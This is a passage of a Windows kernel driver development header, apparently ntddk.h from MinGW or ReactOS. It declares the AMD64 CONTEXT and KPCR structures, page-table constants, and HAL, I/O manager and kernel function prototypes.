  ULONG64 Dr1;
  ULONG64 Dr2;
  ULONG64 Dr3;
  ULONG64 Dr6;
  ULONG64 Dr7;
  ULONG64 Rax;
  ULONG64 Rcx;
  ULONG64 Rdx;
  ULONG64 Rbx;
  ULONG64 Rsp;
  ULONG64 Rbp;
  ULONG64 Rsi;
  ULONG64 Rdi;
  ULONG64 R8;
  ULONG64 R9;
  ULONG64 R10;
  ULONG64 R11;
  ULONG64 R12;
  ULONG64 R13;
  ULONG64 R14;
  ULONG64 R15;
  ULONG64 Rip;
  _ANONYMOUS_UNION union {
    XMM_SAVE_AREA32 FltSave;
    _ANONYMOUS_STRUCT struct {
      M128A Header[2];
      M128A Legacy[8];
      M128A Xmm0;
      M128A Xmm1;
      M128A Xmm2;
      M128A Xmm3;
      M128A Xmm4;
      M128A Xmm5;
      M128A Xmm6;
      M128A Xmm7;
      M128A Xmm8;
      M128A Xmm9;
      M128A Xmm10;
      M128A Xmm11;
      M128A Xmm12;
      M128A Xmm13;
      M128A Xmm14;
      M128A Xmm15;
    } DUMMYSTRUCTNAME;
  } DUMMYUNIONNAME;
  M128A VectorRegister[26];
  ULONG64 VectorControl;
  ULONG64 DebugControl;
  ULONG64 LastBranchToRip;
  ULONG64 LastBranchFromRip;
  ULONG64 LastExceptionToRip;
  ULONG64 LastExceptionFromRip;
} CONTEXT;

#define PCR_MINOR_VERSION 1
#define PCR_MAJOR_VERSION 1

typedef struct _KPCR {
  _ANONYMOUS_UNION union {
    NT_TIB NtTib;
    _ANONYMOUS_STRUCT struct {
      union _KGDTENTRY64 *GdtBase;
      struct _KTSS64 *TssBase;
      ULONG64 UserRsp;
      struct _KPCR *Self;
      struct _KPRCB *CurrentPrcb;
      PKSPIN_LOCK_QUEUE LockArray;
      PVOID Used_Self;
    };
  };
  union _KIDTENTRY64 *IdtBase;
  ULONG64 Unused[2];
  KIRQL Irql;
  UCHAR SecondLevelCacheAssociativity;
  UCHAR ObsoleteNumber;
  UCHAR Fill0;
  ULONG Unused0[3];
  USHORT MajorVersion;
  USHORT MinorVersion;
  ULONG StallScaleFactor;
  PVOID Unused1[3];
  ULONG KernelReserved[15];
  ULONG SecondLevelCacheSize;
  ULONG HalReserved[16];
  ULONG Unused2;
  PVOID KdVersionBlock;
  PVOID Unused3;
  ULONG PcrAlign1[24];
} KPCR, *PKPCR;

FORCEINLINE
PKPCR
KeGetPcr(VOID)
{
    return (PKPCR)__readgsqword(FIELD_OFFSET(KPCR, Self));
}

FORCEINLINE
ULONG
KeGetCurrentProcessorNumber(VOID)
{
    return (ULONG)__readgsword(0x184);
}


#define PTI_SHIFT  12L
#define PDI_SHIFT  21L
#define PPI_SHIFT  30L
#define PXI_SHIFT  39L
#define PTE_PER_PAGE 512
#define PDE_PER_PAGE 512
#define PPE_PER_PAGE 512
#define PXE_PER_PAGE 512
#define PTI_MASK_AMD64 (PTE_PER_PAGE - 1)
#define PDI_MASK_AMD64 (PDE_PER_PAGE - 1)
#define PPI_MASK (PPE_PER_PAGE - 1)
#define PXI_MASK (PXE_PER_PAGE - 1)

#define PXE_BASE    0xFFFFF6FB7DBED000ULL
#define PXE_SELFMAP 0xFFFFF6FB7DBEDF68ULL
#define PPE_BASE    0xFFFFF6FB7DA00000ULL
#define PDE_BASE    0xFFFFF6FB40000000ULL
#define PTE_BASE    0xFFFFF68000000000ULL
#define PXE_TOP     0xFFFFF6FB7DBEDFFFULL
#define PPE_TOP     0xFFFFF6FB7DBFFFFFULL
#define PDE_TOP     0xFFFFF6FB7FFFFFFFULL
#define PTE_TOP     0xFFFFF6FFFFFFFFFFULL

extern NTKERNELAPI PVOID MmHighestUserAddress;
extern NTKERNELAPI PVOID MmSystemRangeStart;
extern NTKERNELAPI ULONG64 MmUserProbeAddress;

#define MM_HIGHEST_USER_ADDRESS           MmHighestUserAddress
#define MM_SYSTEM_RANGE_START             MmSystemRangeStart
#define MM_USER_PROBE_ADDRESS             MmUserProbeAddress
#define MM_LOWEST_USER_ADDRESS   (PVOID)0x10000
#define MM_LOWEST_SYSTEM_ADDRESS (PVOID)0xFFFF080000000000ULL


#elif defined(_M_IA64)

#elif defined(_M_PPC)


#elif defined(_M_MIPS)

#elif defined(_M_ARM)
#else
#error Unknown Architecture
#endif

/******************************************************************************
 *                          Executive Functions                               *
 ******************************************************************************/

static __inline PVOID
ExAllocateFromZone(
  IN PZONE_HEADER Zone)
{
  PVOID Result = (PVOID)Zone->FreeList.Next;
  if (Zone->FreeList.Next)
    Zone->FreeList.Next = Zone->FreeList.Next->Next;
  return Result;
}

static __inline PVOID
ExFreeToZone(
  IN PZONE_HEADER Zone,
  IN PVOID Block)
{
  ((PSINGLE_LIST_ENTRY) Block)->Next = Zone->FreeList.Next;
  Zone->FreeList.Next = ((PSINGLE_LIST_ENTRY) Block);
  return ((PSINGLE_LIST_ENTRY) Block)->Next;
}

/*
 * PVOID
 * ExInterlockedAllocateFromZone(
 *   IN PZONE_HEADER  Zone,
 *   IN PKSPIN_LOCK  Lock)
 */
#define ExInterlockedAllocateFromZone(Zone, Lock) \
    ((PVOID) ExInterlockedPopEntryList(&Zone->FreeList, Lock))

/* PVOID
 * ExInterlockedFreeToZone(
 *  IN PZONE_HEADER  Zone,
 *  IN PVOID  Block,
 *  IN PKSPIN_LOCK  Lock);
 */
#define ExInterlockedFreeToZone(Zone, Block, Lock) \
    ExInterlockedPushEntryList(&(Zone)->FreeList, (PSINGLE_LIST_ENTRY)(Block), Lock)

/*
 * BOOLEAN
 * ExIsFullZone(
 *  IN PZONE_HEADER  Zone)
 */
#define ExIsFullZone(Zone) \
  ((Zone)->FreeList.Next == (PSINGLE_LIST_ENTRY) NULL)

/* BOOLEAN
 * ExIsObjectInFirstZoneSegment(
 *     IN PZONE_HEADER Zone,
 *     IN PVOID Object);
 */
#define ExIsObjectInFirstZoneSegment(Zone,Object) \
    ((BOOLEAN)( ((PUCHAR)(Object) >= (PUCHAR)(Zone)->SegmentList.Next) && \
                ((PUCHAR)(Object) <  (PUCHAR)(Zone)->SegmentList.Next + \
                         (Zone)->TotalSegmentSize)) )

#define ExAcquireResourceExclusive ExAcquireResourceExclusiveLite
#define ExAcquireResourceShared ExAcquireResourceSharedLite
#define ExConvertExclusiveToShared ExConvertExclusiveToSharedLite
#define ExDeleteResource ExDeleteResourceLite
#define ExInitializeResource ExInitializeResourceLite
#define ExIsResourceAcquiredExclusive ExIsResourceAcquiredExclusiveLite
#define ExIsResourceAcquiredShared ExIsResourceAcquiredSharedLite
#define ExIsResourceAcquired ExIsResourceAcquiredSharedLite
#define ExReleaseResourceForThread ExReleaseResourceForThreadLite

#ifndef _M_IX86
#define RESULT_ZERO     0
#define RESULT_NEGATIVE 1
#define RESULT_POSITIVE 2
#endif

typedef enum _INTERLOCKED_RESULT {
  ResultNegative = RESULT_NEGATIVE,
  ResultZero = RESULT_ZERO,
  ResultPositive = RESULT_POSITIVE
} INTERLOCKED_RESULT;

#ifdef _X86_

NTKERNELAPI
INTERLOCKED_RESULT
FASTCALL
Exfi386InterlockedIncrementLong(
  IN OUT LONG volatile *Addend);

NTKERNELAPI
INTERLOCKED_RESULT
FASTCALL
Exfi386InterlockedDecrementLong(
  IN PLONG  Addend);

NTKERNELAPI
ULONG
FASTCALL
Exfi386InterlockedExchangeUlong(
  IN PULONG  Target,
  IN ULONG  Value);

#endif


#if (NTDDI_VERSION >= NTDDI_WIN2K)
NTKERNELAPI
NTSTATUS
NTAPI
ExExtendZone(
  IN OUT PZONE_HEADER Zone,
  IN OUT PVOID Segment,
  IN ULONG SegmentSize);

NTKERNELAPI
NTSTATUS
NTAPI
ExInitializeZone(
  OUT PZONE_HEADER Zone,
  IN ULONG BlockSize,
  IN OUT PVOID InitialSegment,
  IN ULONG InitialSegmentSize);

NTKERNELAPI
NTSTATUS
NTAPI
ExInterlockedExtendZone(
  IN OUT PZONE_HEADER Zone,
  IN OUT PVOID Segment,
  IN ULONG SegmentSize,
  IN OUT PKSPIN_LOCK Lock);

NTKERNELAPI
NTSTATUS
NTAPI
ExUuidCreate(
  OUT UUID *Uuid);

NTKERNELAPI
DECLSPEC_NORETURN
VOID
NTAPI
ExRaiseAccessViolation(VOID);

NTKERNELAPI
DECLSPEC_NORETURN
VOID
NTAPI
ExRaiseDatatypeMisalignment(VOID);

#endif /* (NTDDI_VERSION >= NTDDI_WIN2K) */


/* Hardware Abstraction Layer Functions */

#if (NTDDI_VERSION >= NTDDI_WIN2K)

#if defined(USE_DMA_MACROS) && !defined(_NTHAL_) && (defined(_NTDDK_) || defined(_NTDRIVER_)) || defined(_WDM_INCLUDED_)

/* Nothing here */

#else /* USE_DMA_MACROS ... */

//DECLSPEC_DEPRECATED_DDK
NTHALAPI
VOID
NTAPI
IoFreeAdapterChannel(
  IN PADAPTER_OBJECT AdapterObject);

//DECLSPEC_DEPRECATED_DDK
NTHALAPI
BOOLEAN
NTAPI
IoFlushAdapterBuffers(
  IN PADAPTER_OBJECT AdapterObject,
  IN PMDL Mdl,
  IN PVOID MapRegisterBase,
  IN PVOID CurrentVa,
  IN ULONG Length,
  IN BOOLEAN WriteToDevice);

//DECLSPEC_DEPRECATED_DDK
NTHALAPI
VOID
NTAPI
IoFreeMapRegisters(
  IN PADAPTER_OBJECT AdapterObject,
  IN PVOID MapRegisterBase,
  IN ULONG NumberOfMapRegisters);

//DECLSPEC_DEPRECATED_DDK
NTHALAPI
PVOID
NTAPI
HalAllocateCommonBuffer(
  IN PADAPTER_OBJECT AdapterObject,
  IN ULONG Length,
  OUT PPHYSICAL_ADDRESS LogicalAddress,
  IN BOOLEAN CacheEnabled);

//DECLSPEC_DEPRECATED_DDK
NTHALAPI
VOID
NTAPI
HalFreeCommonBuffer(
  IN PADAPTER_OBJECT AdapterObject,
  IN ULONG Length,
  IN PHYSICAL_ADDRESS LogicalAddress,
  IN PVOID VirtualAddress,
  IN BOOLEAN CacheEnabled);

//DECLSPEC_DEPRECATED_DDK
NTHALAPI
ULONG
NTAPI
HalReadDmaCounter(
  IN PADAPTER_OBJECT AdapterObject);

NTHALAPI
NTSTATUS
NTAPI
HalAllocateAdapterChannel(
  IN PADAPTER_OBJECT  AdapterObject,
  IN PWAIT_CONTEXT_BLOCK  Wcb,
  IN ULONG  NumberOfMapRegisters,
  IN PDRIVER_CONTROL  ExecutionRoutine);

#endif /* USE_DMA_MACROS ... */

#if !defined(NO_LEGACY_DRIVERS)
NTHALAPI
NTSTATUS
NTAPI
HalAssignSlotResources(
  IN PUNICODE_STRING RegistryPath,
  IN PUNICODE_STRING DriverClassName,
  IN PDRIVER_OBJECT DriverObject,
  IN PDEVICE_OBJECT DeviceObject,
  IN INTERFACE_TYPE BusType,
  IN ULONG BusNumber,
  IN ULONG SlotNumber,
  IN OUT PCM_RESOURCE_LIST *AllocatedResources);

NTHALAPI
ULONG
NTAPI
HalGetInterruptVector(
  IN INTERFACE_TYPE InterfaceType,
  IN ULONG BusNumber,
  IN ULONG BusInterruptLevel,
  IN ULONG BusInterruptVector,
  OUT PKIRQL Irql,
  OUT PKAFFINITY Affinity);

NTHALAPI
ULONG
NTAPI
HalSetBusData(
  IN BUS_DATA_TYPE BusDataType,
  IN ULONG BusNumber,
  IN ULONG SlotNumber,
  IN PVOID Buffer,
  IN ULONG Length);

NTHALAPI
ULONG
NTAPI
HalGetBusData(
  IN BUS_DATA_TYPE BusDataType,
  IN ULONG BusNumber,
  IN ULONG SlotNumber,
  OUT PVOID Buffer,
  IN ULONG Length);

NTHALAPI
BOOLEAN
NTAPI
HalMakeBeep(
  IN ULONG Frequency);
#endif /* !defined(NO_LEGACY_DRIVERS) */

NTHALAPI
PADAPTER_OBJECT
NTAPI
HalGetAdapter(
  IN PDEVICE_DESCRIPTION DeviceDescription,
  OUT PULONG NumberOfMapRegisters);

VOID
NTAPI
HalPutDmaAdapter(
  IN PADAPTER_OBJECT DmaAdapter);

NTHALAPI
VOID
NTAPI
HalAcquireDisplayOwnership(
  IN PHAL_RESET_DISPLAY_PARAMETERS ResetDisplayParameters);

NTHALAPI
ULONG
NTAPI
HalGetBusDataByOffset(
  IN BUS_DATA_TYPE BusDataType,
  IN ULONG BusNumber,
  IN ULONG SlotNumber,
  OUT PVOID Buffer,
  IN ULONG Offset,
  IN ULONG Length);

NTHALAPI
ULONG
NTAPI
HalSetBusDataByOffset(
  IN BUS_DATA_TYPE BusDataType,
  IN ULONG BusNumber,
  IN ULONG SlotNumber,
  IN PVOID Buffer,
  IN ULONG Offset,
  IN ULONG Length);

NTHALAPI
BOOLEAN
NTAPI
HalTranslateBusAddress(
  IN INTERFACE_TYPE InterfaceType,
  IN ULONG BusNumber,
  IN PHYSICAL_ADDRESS BusAddress,
  IN OUT PULONG AddressSpace,
  OUT PPHYSICAL_ADDRESS TranslatedAddress);

NTHALAPI
PVOID
NTAPI
HalAllocateCrashDumpRegisters(
  IN PADAPTER_OBJECT AdapterObject,
  IN OUT PULONG NumberOfMapRegisters);

NTSTATUS
NTAPI
HalGetScatterGatherList(
  IN PADAPTER_OBJECT DmaAdapter,
  IN PDEVICE_OBJECT DeviceObject,
  IN PMDL Mdl,
  IN PVOID CurrentVa,
  IN ULONG Length,
  IN PDRIVER_LIST_CONTROL ExecutionRoutine,
  IN PVOID Context,
  IN BOOLEAN WriteToDevice);

VOID
NTAPI
HalPutScatterGatherList(
  IN PADAPTER_OBJECT DmaAdapter,
  IN PSCATTER_GATHER_LIST ScatterGather,
  IN BOOLEAN WriteToDevice);

#endif /* (NTDDI_VERSION >= NTDDI_WIN2K) */

#if (NTDDI_VERSION >= NTDDI_WINXP)
NTKERNELAPI
VOID
FASTCALL
HalExamineMBR(
  IN PDEVICE_OBJECT DeviceObject,
  IN ULONG SectorSize,
  IN ULONG MBRTypeIdentifier,
  OUT PVOID *Buffer);
#endif /* (NTDDI_VERSION >= NTDDI_WINXP) */

#if (NTDDI_VERSION >= NTDDI_WIN7)

NTSTATUS
NTAPI
HalAllocateHardwareCounters(
  IN PGROUP_AFFINITY GroupAffinty,
  IN ULONG GroupCount,
  IN PPHYSICAL_COUNTER_RESOURCE_LIST ResourceList,
  OUT PHANDLE CounterSetHandle);

NTSTATUS
NTAPI
HalFreeHardwareCounters(
  IN HANDLE CounterSetHandle);

#endif /* (NTDDI_VERSION >= NTDDI_WIN7) */

#if defined(_IA64_)
#if (NTDDI_VERSION >= NTDDI_WIN2K)
NTHALAPI
ULONG
NTAPI
HalGetDmaAlignmentRequirement(VOID);
#endif
#endif /* defined(_IA64_) */

#if defined(_M_IX86) || defined(_M_AMD64)
#define HalGetDmaAlignmentRequirement() 1L
#endif

#if (NTDDI_VERSION >= NTDDI_WIN7)

typedef struct _WHEA_ERROR_SOURCE_DESCRIPTOR *PWHEA_ERROR_SOURCE_DESCRIPTOR;
typedef struct _WHEA_ERROR_RECORD *PWHEA_ERROR_RECORD;

NTHALAPI
VOID
NTAPI
HalBugCheckSystem(
  IN PWHEA_ERROR_SOURCE_DESCRIPTOR ErrorSource,
  IN PWHEA_ERROR_RECORD ErrorRecord);

#else

typedef struct _WHEA_ERROR_RECORD *PWHEA_ERROR_RECORD;

NTHALAPI
VOID
NTAPI
HalBugCheckSystem(
  IN PWHEA_ERROR_RECORD ErrorRecord);

#endif /* (NTDDI_VERSION >= NTDDI_WIN7) */

/******************************************************************************
 *                         I/O Manager Functions                              *
 ******************************************************************************/

/*
 * VOID IoAssignArcName(
 *   IN PUNICODE_STRING  ArcName,
 *   IN PUNICODE_STRING  DeviceName);
 */
#define IoAssignArcName(_ArcName, _DeviceName) ( \
  IoCreateSymbolicLink((_ArcName), (_DeviceName)))

/*
 * VOID
 * IoDeassignArcName(
 *   IN PUNICODE_STRING  ArcName)
 */
#define IoDeassignArcName IoDeleteSymbolicLink

FORCEINLINE
VOID
NTAPI
IoInitializeDriverCreateContext(
  PIO_DRIVER_CREATE_CONTEXT DriverContext)
{
  RtlZeroMemory(DriverContext, sizeof(IO_DRIVER_CREATE_CONTEXT));
  DriverContext->Size = sizeof(IO_DRIVER_CREATE_CONTEXT);
}

#if (NTDDI_VERSION >= NTDDI_WIN2K)

#if !(defined(USE_DMA_MACROS) && (defined(_NTDDK_) || defined(_NTDRIVER_)) || defined(_WDM_INCLUDED_))
NTKERNELAPI
NTSTATUS
NTAPI
IoAllocateAdapterChannel(
  IN PADAPTER_OBJECT AdapterObject,
  IN PDEVICE_OBJECT DeviceObject,
  IN ULONG NumberOfMapRegisters,
  IN PDRIVER_CONTROL ExecutionRoutine,
  IN PVOID Context);
#endif

#if !defined(DMA_MACROS_DEFINED)
//DECLSPEC_DEPRECATED_DDK
NTHALAPI
PHYSICAL_ADDRESS
NTAPI
IoMapTransfer(
  IN PADAPTER_OBJECT AdapterObject,
  IN PMDL Mdl,
  IN PVOID MapRegisterBase,
  IN PVOID CurrentVa,
  IN OUT PULONG Length,
  IN BOOLEAN WriteToDevice);
#endif

NTKERNELAPI
VOID
NTAPI
IoAllocateController(
  IN PCONTROLLER_OBJECT ControllerObject,
  IN PDEVICE_OBJECT DeviceObject,
  IN PDRIVER_CONTROL ExecutionRoutine,
  IN PVOID Context OPTIONAL);

NTKERNELAPI
PCONTROLLER_OBJECT
NTAPI
IoCreateController(
  IN ULONG Size);

NTKERNELAPI
VOID
NTAPI
IoDeleteController(
  IN PCONTROLLER_OBJECT ControllerObject);

NTKERNELAPI
VOID
NTAPI
IoFreeController(
  IN PCONTROLLER_OBJECT ControllerObject);

NTKERNELAPI
PCONFIGURATION_INFORMATION
NTAPI
IoGetConfigurationInformation(VOID);

NTKERNELAPI
PDEVICE_OBJECT
NTAPI
IoGetDeviceToVerify(
  IN PETHREAD Thread);

NTKERNELAPI
VOID
NTAPI
IoCancelFileOpen(
  IN PDEVICE_OBJECT DeviceObject,
  IN PFILE_OBJECT FileObject);

NTKERNELAPI
PGENERIC_MAPPING
NTAPI
IoGetFileObjectGenericMapping(VOID);

NTKERNELAPI
PIRP
NTAPI
IoMakeAssociatedIrp(
  IN PIRP Irp,
  IN CCHAR StackSize);

NTKERNELAPI
NTSTATUS
NTAPI
IoQueryDeviceDescription(
  IN PINTERFACE_TYPE BusType OPTIONAL,
  IN PULONG BusNumber OPTIONAL,
  IN PCONFIGURATION_TYPE ControllerType OPTIONAL,
  IN PULONG ControllerNumber OPTIONAL,
  IN PCONFIGURATION_TYPE PeripheralType OPTIONAL,
  IN PULONG PeripheralNumber OPTIONAL,
  IN PIO_QUERY_DEVICE_ROUTINE CalloutRoutine,
  IN OUT PVOID Context OPTIONAL);

NTKERNELAPI
VOID
NTAPI
IoRaiseHardError(
  IN PIRP Irp,
  IN PVPB Vpb OPTIONAL,
  IN PDEVICE_OBJECT RealDeviceObject);

NTKERNELAPI
BOOLEAN
NTAPI
IoRaiseInformationalHardError(
  IN NTSTATUS ErrorStatus,
  IN PUNICODE_STRING String OPTIONAL,
  IN PKTHREAD Thread OPTIONAL);

NTKERNELAPI
VOID
NTAPI
IoRegisterBootDriverReinitialization(
  IN PDRIVER_OBJECT DriverObject,
  IN PDRIVER_REINITIALIZE DriverReinitializationRoutine,
  IN PVOID Context OPTIONAL);

NTKERNELAPI
VOID
NTAPI
IoRegisterDriverReinitialization(
  IN PDRIVER_OBJECT DriverObject,
  IN PDRIVER_REINITIALIZE DriverReinitializationRoutine,
  IN PVOID Context OPTIONAL);

NTKERNELAPI
NTSTATUS
NTAPI
IoAttachDeviceByPointer(
  IN PDEVICE_OBJECT SourceDevice,
  IN PDEVICE_OBJECT TargetDevice);

NTKERNELAPI
NTSTATUS
NTAPI
IoReportDetectedDevice(
  IN PDRIVER_OBJECT DriverObject,
  IN INTERFACE_TYPE LegacyBusType,
  IN ULONG BusNumber,
  IN ULONG SlotNumber,
  IN PCM_RESOURCE_LIST ResourceList OPTIONAL,
  IN PIO_RESOURCE_REQUIREMENTS_LIST ResourceRequirements OPTIONAL,
  IN BOOLEAN ResourceAssigned,
  IN OUT PDEVICE_OBJECT *DeviceObject OPTIONAL);

NTKERNELAPI
NTSTATUS
NTAPI
IoReportResourceForDetection(
  IN PDRIVER_OBJECT DriverObject,
  IN PCM_RESOURCE_LIST DriverList OPTIONAL,
  IN ULONG DriverListSize OPTIONAL,
  IN PDEVICE_OBJECT DeviceObject OPTIONAL,
  IN PCM_RESOURCE_LIST DeviceList OPTIONAL,
  IN ULONG DeviceListSize OPTIONAL,
  OUT PBOOLEAN ConflictDetected);

NTKERNELAPI
NTSTATUS
NTAPI
IoReportResourceUsage(
  IN PUNICODE_STRING DriverClassName OPTIONAL,
  IN PDRIVER_OBJECT DriverObject,
  IN PCM_RESOURCE_LIST DriverList OPTIONAL,
  IN ULONG DriverListSize OPTIONAL,
  IN PDEVICE_OBJECT DeviceObject,
  IN PCM_RESOURCE_LIST DeviceList OPTIONAL,
  IN ULONG DeviceListSize OPTIONAL,
  IN BOOLEAN OverrideConflict,
  OUT PBOOLEAN ConflictDetected);

NTKERNELAPI
VOID
NTAPI
IoSetHardErrorOrVerifyDevice(
  IN PIRP Irp,
  IN PDEVICE_OBJECT DeviceObject);

NTKERNELAPI
NTSTATUS
NTAPI
IoAssignResources(
  IN PUNICODE_STRING RegistryPath,
  IN PUNICODE_STRING DriverClassName OPTIONAL,
  IN PDRIVER_OBJECT DriverObject,
  IN PDEVICE_OBJECT DeviceObject OPTIONAL,
  IN PIO_RESOURCE_REQUIREMENTS_LIST RequestedResources OPTIONAL,
  IN OUT PCM_RESOURCE_LIST *AllocatedResources);

NTKERNELAPI
BOOLEAN
NTAPI
IoSetThreadHardErrorMode(
  IN BOOLEAN EnableHardErrors);


#endif /* (NTDDI_VERSION >= NTDDI_WIN2K) */

#if (NTDDI_VERSION >= NTDDI_WIN2KSP3)

NTKERNELAPI
BOOLEAN
NTAPI
IoIsFileOriginRemote(
  IN PFILE_OBJECT FileObject);

NTKERNELAPI
NTSTATUS
NTAPI
IoSetFileOrigin(
  IN PFILE_OBJECT FileObject,
  IN BOOLEAN Remote);

#endif /* (NTDDI_VERSION >= NTDDI_WIN2KSP3) */

#if (NTDDI_VERSION >= NTDDI_WINXP)

NTKERNELAPI
NTSTATUS
FASTCALL
IoReadPartitionTable(
  IN PDEVICE_OBJECT DeviceObject,
  IN ULONG SectorSize,
  IN BOOLEAN ReturnRecognizedPartitions,
  OUT struct _DRIVE_LAYOUT_INFORMATION **PartitionBuffer);

NTKERNELAPI
NTSTATUS
FASTCALL
IoSetPartitionInformation(
  IN PDEVICE_OBJECT DeviceObject,
  IN ULONG SectorSize,
  IN ULONG PartitionNumber,
  IN ULONG PartitionType);

NTKERNELAPI
NTSTATUS
FASTCALL
IoWritePartitionTable(
  IN PDEVICE_OBJECT DeviceObject,
  IN ULONG SectorSize,
  IN ULONG SectorsPerTrack,
  IN ULONG NumberOfHeads,
  IN struct _DRIVE_LAYOUT_INFORMATION *PartitionBuffer);

NTKERNELAPI
NTSTATUS
NTAPI
IoCreateDisk(
  IN PDEVICE_OBJECT DeviceObject,
  IN struct _CREATE_DISK* Disk OPTIONAL);

NTKERNELAPI
NTSTATUS
NTAPI
IoReadDiskSignature(
  IN PDEVICE_OBJECT DeviceObject,
  IN ULONG BytesPerSector,
  OUT PDISK_SIGNATURE Signature);

NTKERNELAPI
NTSTATUS
NTAPI
IoReadPartitionTableEx(
  IN PDEVICE_OBJECT DeviceObject,
  OUT struct _DRIVE_LAYOUT_INFORMATION_EX **PartitionBuffer);

NTKERNELAPI
NTSTATUS
NTAPI
IoSetPartitionInformationEx(
  IN PDEVICE_OBJECT DeviceObject,
  IN ULONG PartitionNumber,
  IN struct _SET_PARTITION_INFORMATION_EX *PartitionInfo);

NTKERNELAPI
NTSTATUS
NTAPI
IoSetSystemPartition(
  IN PUNICODE_STRING VolumeNameString);

NTKERNELAPI
NTSTATUS
NTAPI
IoVerifyPartitionTable(
  IN PDEVICE_OBJECT DeviceObject,
  IN BOOLEAN FixErrors);

NTKERNELAPI
NTSTATUS
NTAPI
IoVolumeDeviceToDosName(
  IN PVOID VolumeDeviceObject,
  OUT PUNICODE_STRING DosName);

NTKERNELAPI
NTSTATUS
NTAPI
IoWritePartitionTableEx(
  IN PDEVICE_OBJECT DeviceObject,
  IN struct _DRIVE_LAYOUT_INFORMATION_EX *DriveLayout);

NTKERNELAPI
NTSTATUS
NTAPI
IoCreateFileSpecifyDeviceObjectHint(
  OUT PHANDLE FileHandle,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  IN PLARGE_INTEGER AllocationSize OPTIONAL,
  IN ULONG FileAttributes,
  IN ULONG ShareAccess,
  IN ULONG Disposition,
  IN ULONG CreateOptions,
  IN PVOID EaBuffer OPTIONAL,
  IN ULONG EaLength,
  IN CREATE_FILE_TYPE CreateFileType,
  IN PVOID InternalParameters OPTIONAL,
  IN ULONG Options,
  IN PVOID DeviceObject OPTIONAL);

NTKERNELAPI
NTSTATUS
NTAPI
IoAttachDeviceToDeviceStackSafe(
  IN PDEVICE_OBJECT SourceDevice,
  IN PDEVICE_OBJECT TargetDevice,
  OUT PDEVICE_OBJECT *AttachedToDeviceObject);


#endif /* (NTDDI_VERSION >= NTDDI_WINXP) */

#if (NTDDI_VERSION >= NTDDI_WS03)
NTKERNELAPI
IO_PAGING_PRIORITY
FASTCALL
IoGetPagingIoPriority(
  IN PIRP Irp);

#endif /* (NTDDI_VERSION >= NTDDI_WS03) */
#if (NTDDI_VERSION >= NTDDI_WS03SP1)

BOOLEAN
NTAPI
IoTranslateBusAddress(
  IN INTERFACE_TYPE InterfaceType,
  IN ULONG BusNumber,
  IN PHYSICAL_ADDRESS BusAddress,
  IN OUT PULONG AddressSpace,
  OUT PPHYSICAL_ADDRESS TranslatedAddress);
#endif /* (NTDDI_VERSION >= NTDDI_WS03SP1) */

#if (NTDDI_VERSION >= NTDDI_VISTA)
NTKERNELAPI
NTSTATUS
NTAPI
IoUpdateDiskGeometry(
  IN PDEVICE_OBJECT DeviceObject,
  IN struct _DISK_GEOMETRY_EX* OldDiskGeometry,
  IN struct _DISK_GEOMETRY_EX* NewDiskGeometry);

PTXN_PARAMETER_BLOCK
NTAPI
IoGetTransactionParameterBlock(
  IN PFILE_OBJECT FileObject);

NTKERNELAPI
NTSTATUS
NTAPI
IoCreateFileEx(
  OUT PHANDLE FileHandle,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  IN PLARGE_INTEGER AllocationSize OPTIONAL,
  IN ULONG FileAttributes,
  IN ULONG ShareAccess,
  IN ULONG Disposition,
  IN ULONG CreateOptions,
  IN PVOID EaBuffer OPTIONAL,
  IN ULONG EaLength,
  IN CREATE_FILE_TYPE CreateFileType,
  IN PVOID InternalParameters OPTIONAL,
  IN ULONG Options,
  IN PIO_DRIVER_CREATE_CONTEXT DriverContext OPTIONAL);

NTSTATUS
NTAPI
IoSetIrpExtraCreateParameter(
  IN OUT PIRP Irp,
  IN struct _ECP_LIST *ExtraCreateParameter);

VOID
NTAPI
IoClearIrpExtraCreateParameter(
  IN OUT PIRP Irp);

NTSTATUS
NTAPI
IoGetIrpExtraCreateParameter(
  IN PIRP Irp,
  OUT struct _ECP_LIST **ExtraCreateParameter OPTIONAL);

BOOLEAN
NTAPI
IoIsFileObjectIgnoringSharing(
  IN PFILE_OBJECT FileObject);

#endif /* (NTDDI_VERSION >= NTDDI_VISTA) */

#if (NTDDI_VERSION >= NTDDI_WIN7)

NTSTATUS
NTAPI
IoSetFileObjectIgnoreSharing(
  IN PFILE_OBJECT FileObject);

#endif /* (NTDDI_VERSION >= NTDDI_WIN7) */

/******************************************************************************
 *                          Kernel Debugger Functions                         *
 ******************************************************************************/
NTSYSAPI
ULONG
NTAPI
DbgPrompt(
  IN PCCH Prompt,
  OUT PCH Response,
  IN ULONG MaximumResponseLength);

/******************************************************************************
 *                              Kernel Functions                              *
 ******************************************************************************/

NTKERNELAPI
VOID
FASTCALL
KeInvalidateRangeAllCaches(
  IN PVOID BaseAddress,
  IN ULONG Length);

#if (NTDDI_VERSION >= NTDDI_WIN2K)

NTKERNELAPI
VOID
NTAPI
KeSetImportanceDpc(
  IN OUT PRKDPC Dpc,
  IN KDPC_IMPORTANCE Importance);

NTKERNELAPI
LONG
NTAPI
KePulseEvent(
  IN OUT PRKEVENT Event,
  IN KPRIORITY Increment,
  IN BOOLEAN Wait);

NTKERNELAPI
LONG
NTAPI
KeSetBasePriorityThread(
  IN OUT PRKTHREAD Thread,
  IN LONG Increment);

NTKERNELAPI
VOID
NTAPI
KeEnterCriticalRegion(VOID);

NTKERNELAPI
VOID
NTAPI
KeLeaveCriticalRegion(VOID);

NTKERNELAPI
DECLSPEC_NORETURN
VOID
NTAPI
KeBugCheck(
  IN ULONG BugCheckCode);
#if defined(SINGLE_GROUP_LEGACY_API)


NTKERNELAPI
VOID
NTAPI
KeSetTargetProcessorDpc(
  IN OUT PRKDPC Dpc,
  IN CCHAR Number);

NTKERNELAPI
KAFFINITY
NTAPI
KeQueryActiveProcessors(VOID);
#endif /* defined(SINGLE_GROUP_LEGACY_API) */


#endif /* (NTDDI_VERSION >= NTDDI_WIN2K) */

#if (NTDDI_VERSION >= NTDDI_WINXP)

NTKERNELAPI
BOOLEAN
NTAPI
KeAreApcsDisabled(VOID);

#endif /* (NTDDI_VERSION >= NTDDI_WINXP) */

#if (NTDDI_VERSION >= NTDDI_WS03)


NTKERNELAPI
BOOLEAN
NTAPI
KeInvalidateAllCaches(VOID);
#endif /* (NTDDI_VERSION >= NTDDI_WS03) */
#if (NTDDI_VERSION >= NTDDI_WS03SP1)
